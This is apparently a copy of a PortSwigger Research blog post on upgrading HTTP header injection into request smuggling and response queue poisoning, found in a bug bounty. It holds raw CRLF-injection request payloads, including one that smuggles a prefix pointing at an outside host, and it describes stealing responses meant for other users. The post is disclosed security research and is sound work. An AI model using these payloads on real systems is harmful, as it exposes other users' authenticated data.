---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-22_making-http-header-injection-critical-via-response-queue-poisoning.md
original_filename: 2022-09-22_making-http-header-injection-critical-via-response-queue-poisoning.md
title: Making HTTP header injection critical via response queue poisoning
category: documents
detected_topics:
- ssrf
- xss
- csrf
- sqli
- command-injection
- path-traversal
tags:
- imported
- documents
- ssrf
- xss
- csrf
- sqli
- command-injection
- path-traversal
language: en
raw_sha256: be3519586b5fec5be4669a8308778b0bf7774a29dd7132fd919813a98c27c956
text_sha256: f1449ce83424ac31c1a88be28786afd9c6dcfa4bc9aae1a970835404f2f98555
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Making HTTP header injection critical via response queue poisoning

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-22_making-http-header-injection-critical-via-response-queue-poisoning.md
- Source Type: markdown
- Detected Topics: ssrf, xss, csrf, sqli, command-injection, path-traversal
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `be3519586b5fec5be4669a8308778b0bf7774a29dd7132fd919813a98c27c956`
- Text SHA256: `f1449ce83424ac31c1a88be28786afd9c6dcfa4bc9aae1a970835404f2f98555`


## Content

---
title: "Making HTTP header injection critical via response queue poisoning"
page_title: "Making HTTP header injection critical via response queue poisoning | PortSwigger Research"
url: "https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning"
final_url: "https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning"
authors: ["James Kettle (@albinowax)"]
bugs: ["HTTP header injection", "HTTP request smuggling"]
bounty: "12,500"
publication_date: "2022-09-22"
added_date: "2022-09-22"
source: "pentester.land/writeups.json"
original_index: 2134
---

[](/)

[Login](/users)

Products Solutions [Research](/research) [Academy](/web-security) Support Company

[Customers](/customers) [About](/about) [Blog](/blog) [Careers](/careers) [Legal](/legal) [Contact](/contact) [Resellers](/support/reseller-faqs)

[My account](/users/youraccount) [Customers](/customers) [About](/about) [Blog](/blog) [Careers](/careers) [Legal](/legal) [Contact](/contact) [Resellers](/support/reseller-faqs)

[ ![Burp Suite DAST](/content/images/svg/icons/enterprise.svg) **Burp Suite DAST** The enterprise-enabled dynamic web vulnerability scanner. ](/burp/enterprise) [ ![Burp Suite Professional](/content/images/svg/icons/professional.svg) **Burp Suite Professional** The world's #1 web penetration testing toolkit. ](/burp/pro) [ ![Burp Suite Community Edition](/content/images/svg/icons/community.svg) **Burp Suite Community Edition** The best manual tools to start web security testing. ](/burp/communitydownload) [View all product editions](/burp)

[ **Burp Scanner** Burp Suite's web vulnerability scanner ![Burp Suite's web vulnerability scanner'](/mega-nav/images/burp-suite-scanner.jpg) ](/burp/vulnerability-scanner)

[ **Attack surface visibility** Improve security posture, prioritize manual testing, free up time. ](/solutions/attack-surface-visibility) [ **CI-driven scanning** More proactive security - find and fix vulnerabilities earlier. ](/solutions/ci-driven-scanning) [ **Application security testing** See how our software enables the world to secure the web. ](/solutions) [ **DevSecOps** Catch critical bugs; ship more secure software, more quickly. ](/solutions/devsecops) [ **Penetration testing** Accelerate penetration testing - find more bugs, more quickly. ](/solutions/penetration-testing) [ **Automated scanning** Scale dynamic scanning. Reduce risk. Save time/money. ](/solutions/automated-security-testing) [ **Bug bounty hunting** Level up your hacking and earn more bug bounties. ](/solutions/bug-bounty-hunting) [ **Compliance** Enhance security monitoring to comply with confidence. ](/solutions/compliance)

[View all solutions](/solutions)

[ **Product comparison** What's the difference between Pro and DAST? ![Burp Suite Professional vs Burp Suite DAST](/mega-nav/images/burp-suite.jpg) ](/burp/dast/resources/dast-vs-professional)

[ **Support Center** Get help and advice from our experts on all things Burp. ](/support) [ **Documentation** Tutorials and guides for Burp Suite. ](/burp/documentation) [ **Get Started - Professional** Get started with Burp Suite Professional. ](/burp/documentation/desktop/getting-started) [ **Get Started - DAST** Get started with Burp Suite DAST. ](/burp/documentation/dast/getting-started) [ **Downloads** Download the latest version of Burp Suite. ](/burp/releases)

[Visit the Support Center](/support)

[ **Downloads** Download the latest version of Burp Suite. ![The latest version of Burp Suite software for download](/mega-nav/images/latest-burp-suite-software-download.jpg) ](/burp/releases)

Articles

  * [Overview](/research)
  * Core Topics

[Black Hat](/research/black-hat) [XSS](/research/cross-site-scripting-research) [Request Smuggling](/research/request-smuggling) [Template Injection](/research/template-injection) [Top 10 Hacking Techniques](/research/top-10-web-hacking-techniques)

  * [Articles](/research/articles)
  * Meet the Researchers

[James Kettle](/research/james-kettle) [Gareth Heyes](/research/gareth-heyes) [Zakhar Fedotkin](/research/zakhar-fedotkin)

  * [Talks](/research/talks)
  * [ RSS  ](/research/rss)

# Making HTTP header injection critical via response queue poisoning

  * [ ](https://twitter.com/share?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fmaking-http-header-injection-critical-via-response-queue-poisoning&text=Making+HTTP+header+injection+critical+via+response+queue+poisoning%20-%20%40PortSwiggerRes%0A)
  * [ ](https://api.whatsapp.com/send?text=https%3A%2F%2Fportswigger.net%2Fresearch%2Fmaking-http-header-injection-critical-via-response-queue-poisoning)
  * [ ](https://reddit.com/submit?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fmaking-http-header-injection-critical-via-response-queue-poisoning)
  * [ ](https://www.linkedin.com/sharing/share-offsite?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fmaking-http-header-injection-critical-via-response-queue-poisoning)
  * [ ](mailto:?subject=Making+HTTP+header+injection+critical+via+response+queue+poisoning&body=Making+HTTP+header+injection+critical+via+response+queue+poisoning%0A%0AHTTP+header+injection+is+often+under-estimated+and+misclassified+as+a+moderate+severity+flaw+equivalent+to+XSS+or+worse%2C+Open+Redirection.+In+this+post%2C+I%27ll+share+a+simple+technique+I+used+to+take+a+%0A%0Ahttps://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
  * [ ](/research/rss)

![James Kettle](/content/images/profiles/callout_james_kettle_112px.png)

### [James Kettle](/research/james-kettle)

Director of Research

[@albinowax](https://twitter.com/albinowax)

  * **Published:** Thursday, 22 September 2022 at 14:00 UTC

  * **Updated:** Monday, 26 September 2022 at 14:26 UTC

  * 

![](/cms/images/0e/f6/e2dd-article-making_http_header_injection_blog-article_copy.jpg)

HTTP header injection is often under-estimated and misclassified as a moderate severity flaw equivalent to [XSS](/web-security/cross-site-scripting) or worse, Open Redirection. In this post, I'll share a simple technique I used to take a header injection vulnerability, make it critical, and earn a $12,500 bounty.

This technique applies to both request header injection on front-end servers, and response header injection on back-end servers.

### Background

This all started when out of the blue, a stranger emailed me a path-based request header injection and asked if I had any ideas for exploitation. The vulnerability was on a major, high-traffic site serving critical functionality that we'll refer to as 'redacted.net':

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0a%0d%0a HTTP/1.1  
Host: redacted.net  
  
HTTP/1.1 200 OK  
  
GET /%20HTTP/1.1%0d%0anothost:%20redacted.net%0d%0a%0d%0a HTTP/1.1  
Host: redacted.net  
  
HTTP/1.1 400 Bad Request`

I don't typically engage with emails like this, as usually the reporter has got stuck because it's genuinely unexploitable and I don't have any tricks up my sleeve to help. However, I'd [long suspected](https://twitter.com/albinowax/status/1412778191119396864) that it might be possible to upgrade header injection vulnerabilities into request smuggling. Also, the target website was under a bug bounty program which is known for competitive bounty payouts, and the reporter - [xorb ](https://twitter.com/evil_xorb)\- agreed to a 50/50 bounty split if I could help.

### Upgrading header injection into HTTP request smuggling

The concept is simple - you can convert a request header injection into a more serious HTTP desync with a few easy steps.

First, identify where your injection is occurring and add anything necessary to cleanly exit the context:

`GET /%20HTTP/1.1%0d%0a%0d%0a HTTP/1.1  
  
HTTP/1.1 400 Bad Request  
Connection: close`

Then inject essential headers to ensure the back-end keeps the connection open after responding to the initial request:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1  
  
HTTP/1.1 200 OK  
Connection: keep-alive`

At this point we can specify a second request fully under our control, so we're set up for a classic request smuggling attack. The only significant difference is that we'll need to account for the server appending additional headers/body after our injection. Here's two of the many options for cross-user exploitation. 

Specifying a malicious prefix to poison either the next user's request, or a web cache:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

Or crafting our prefix to combine with the trailing junk and create a complete second request in order to trigger response queue poisoning.

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

I went for the latter option, which successfully lead to me intermittently receiving responses intended for other authenticated users. I have a beautiful screenshot showing this, but sadly I was unable to get permission to name the target.

This was sufficient to prove critical impact to the target, who patched it in under 24 hours and awarded a $12,500 bounty. 

If you run into issues applying this technique for yourself, these two closely related posts may be useful:

  * [Response queue poisoning in Jira](https://portswigger.net/research/http2#splitting)
  * [HTTP request smuggling using CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced#request-smuggling-via-crlf-injection)

### Response header injection and the stacked-response problem

As we've seen, upgrading request header injection into a desync is pretty easy. Sometimes, upgrading response header injection is similarly straightforward. However, other times it mysteriously fails. I recently discovered a defence mechanism which I believe explains this, and hints at a possible solution. 

When web browsers read in a response, if they encounter more data than the server promised in the Content-Length header, they truncate the response and close the connection. I dubbed this the [stacked-response problem](https://portswigger.net/research/browser-powered-desync-attacks#:~:text=stacked%2Dresponse%20problem), and found it made exploiting Client-Side Desync vulnerabilities tougher but not impossible.

I now suspect some major front-end servers have a similar mechanism, which has two security implications:

  * Regular desync attacks are unaffected, but response-queue poisoning is mitigated
  * It's difficult to convert response header injection into a HTTP desync

If your attempts at causing a desync via response header injection fail, you may have encountered this mechanism. To bypass it, you need to delay the injected response so that the front-end's over-read doesn't see it. 

One possible approach for this is to inject a large number of newlines, which are typically consumed by servers without triggering request/response processing.

Ultimately, this aspect needs further research. If you encounter this challenge on a bug bounty program and get stuck, I'd be happy to see if I can help. I should also mention if the website you've found header injection on doesn't have a front-end, these techniques won't work as-is but you may still be able to achieve a client-side desync.

### Final notes

I suspect these techniques used to be known but got forgotten alongside [HTTP Request Smuggling](/web-security/request-smuggling), which explains why some people refer to response header injection as 'response splitting' even though they never actually split the response. For a deeper exploration of the phenomenon of forgotten security knowledge, check out [Hunting Evasive Vulnerabilities](https://portswigger.net/research/hunting-evasive-vulnerabilities).

I hope these techniques are useful for you, we'd [love to hear](https://twitter.com/PortSwiggerRes) if you find success with them.

[ Request Smuggling ](/research/request-smuggling)

[Back to all articles](/research/articles)

## Related Research

### [ How to distinguish HTTP pipelining from request smuggling 19 August 2025 How to distinguish HTTP pipelining from request smuggling ](/research/how-to-distinguish-http-pipelining-from-request-smuggling) ### [ 06 August 2025 ](/research/http1-must-die) ### [ Making desync attacks easy with TRACE 19 March 2024 Making desync attacks easy with TRACE ](/research/trace-desync-attack) ### [ How to turn security research into profit 06 September 2022 How to turn security research into profit ](/research/how-to-turn-security-research-into-profit)

Burp Suite

[Web vulnerability scanner](/burp/vulnerability-scanner) [Burp Suite Editions](/burp) [Release Notes](/burp/releases)

Vulnerabilities

[Cross-site scripting (XSS)](/web-security/cross-site-scripting) [SQL injection](/web-security/sql-injection) [Cross-site request forgery](/web-security/csrf) [XML external entity injection](/web-security/xxe) [Directory traversal](/web-security/file-path-traversal) [Server-side request forgery](/web-security/ssrf)

Customers

[Organizations](/organizations) [Testers](/testers) [Developers](/developers)

Company

[About](/about) [Careers](/careers) [Contact](/about/contact) [Legal](/legal) [Privacy Notice](/privacy) [Modern Slavery Statement](/modern-slavery-statement)

Insights

[Web Security Academy](/web-security) [Blog](/blog) [Research](/research) [Engineering](/engineering)

[![PortSwigger Logo](/content/images/logos/portswigger-logo.svg)](/) [ Follow us](https://twitter.com/Burp_Suite)

© 2026 PortSwigger Ltd.
